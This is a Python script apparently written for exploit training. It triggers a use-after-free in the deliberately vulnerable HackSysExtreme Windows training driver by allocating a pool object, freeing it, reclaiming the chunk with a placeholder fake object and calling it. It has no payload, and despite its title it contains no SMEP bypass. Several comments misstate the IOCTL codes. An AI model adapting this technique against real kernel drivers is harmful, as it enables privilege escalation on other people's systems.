# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Use-After-Free/SMEP Enabled)
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi

# 0x70 = Pool chunk size from AllocateUaFObject()
allocation = "\x41" * 0x8
allocation += "\x42" * (0x70-len(allocation))

# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# Allocating UaF object
print "[+] Allocating UaF object..."

# 0x0022013 = IOCTL code that will jump to AllocateUaF() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x00222013,                         # dwIoControlCode
    None,                      			# lpInBuffer
    None,                               # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Freeing UaF object
print "[+] Freeing UaF object..."

# 0x002201B = IOCTL code that will jump to FreeUaFObject() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022201B,                         # dwIoControlCode
    None,                      			# lpInBuffer
    None,                               # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Overwriting dangling pointer with our own objects
print "[+] Storing fake objects..."

# 0x002201B = IOCTL code that will jump to AllocateFakeObject() functioh
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022201F,                         # dwIoControlCode
    allocation,                      	 # lpInBuffer
    len(allocation),                    # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Calling UaF object
print "[+] Calling fake object..."

# 0x0022017 = IOCTL code that will jump to UseUaFObject() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x00222017,                         # dwIoControlCode
    None, 		               			# lpInBuffer
    None,                 				# nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)
